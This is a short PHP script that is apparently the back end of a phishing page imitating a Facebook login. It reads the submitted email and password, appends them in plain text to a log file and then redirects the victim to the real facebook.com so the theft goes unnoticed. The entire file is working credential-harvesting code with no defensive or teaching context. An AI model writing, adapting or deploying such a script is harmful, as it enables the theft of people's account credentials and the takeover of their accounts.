<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $log = "Email: $email | Password: $pass" . PHP_EOL;
    file_put_contents("log.txt", $log, FILE_APPEND);
    header("Location: https://www.facebook.com"); // redirect after saving
    exit();
}
?>
